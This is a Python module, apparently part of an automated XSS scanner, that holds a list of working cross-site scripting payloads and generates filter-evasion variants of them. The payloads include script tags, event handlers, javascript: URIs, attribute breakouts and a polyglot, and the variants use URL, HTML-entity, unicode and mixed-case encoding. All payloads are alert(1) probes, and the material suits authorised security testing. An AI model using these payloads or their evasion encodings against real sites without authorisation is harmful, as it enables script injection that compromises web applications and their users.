"""Payload Generation Agent - Generates and encodes XSS payloads"""

import random
import urllib.parse
from typing import List, Dict, Optional


class PayloadAgent:
    def __init__(self, custom_payloads: Optional[List[str]] = None):
        self.base_payloads = self._load_payloads()
        if custom_payloads:
            self.base_payloads.extend(custom_payloads)
        self.encoding_techniques = [
            self._url_encode,
            self._html_encode,
            self._unicode_encode,
            self._mixed_case
        ]
        
    def _load_payloads(self) -> List[str]:
        payloads = [
            # Basic script injection
            '<script>alert(1)</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<svg><animate onbegin=alert(1)>',
            
            # JavaScript protocol
            'javascript:alert(1)',
            '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)',
            
            # HTML injection
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            
            # Polyglot payloads
            'jaVasCript:/*-/*`/*\\`/*"</img></noscript></title></textarea></style></template>--><img src=x onerror=alert(1)>">',
            '"><img src=x onerror=alert(1)//>',
            
            # Encoded variations
            '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
            '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;',
            
            # Custom payloads
            '<a href="javascript:alert(1)">click</a>',
            '<form action="javascript:alert(1)"><input type="submit">',
            '<iframe src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
        ]
        
        # Load additional payloads from file if exists
        try:
            with open('payloads/custom_payloads.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append(line)
        except FileNotFoundError:
            pass
            
        return payloads
        
    def generate_payloads(self) -> List[Dict]:
        """Generate payloads with variations and encodings"""
        payloads = []
        
        for base in self.base_payloads:
            payloads.append({
                'payload': base,
                'type': 'raw',
                'context': 'auto'
            })
            
            # Generate encoded variations
            for encoder in self.encoding_techniques:
                encoded = encoder(base)
                if encoded != base:
                    payloads.append({
                        'payload': encoded,
                        'type': encoder.__name__.replace('_', ' '),
                        'context': 'auto'
                    })
                    
        return payloads
        
    def _url_encode(self, payload: str) -> str:
        return urllib.parse.quote(payload, safe='')
        
    def _html_encode(self, payload: str) -> str:
        result = ''
        for char in payload:
            if char.isalpha():
                result += f'&#{ord(char)};'
            else:
                result += char
        return result
        
    def _unicode_encode(self, payload: str) -> str:
        return payload.encode('unicode_escape').decode('ascii')
        
    def _mixed_case(self, payload: str) -> str:
        result = ''
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.random() > 0.5 else char.lower()
            else:
                result += char
        return result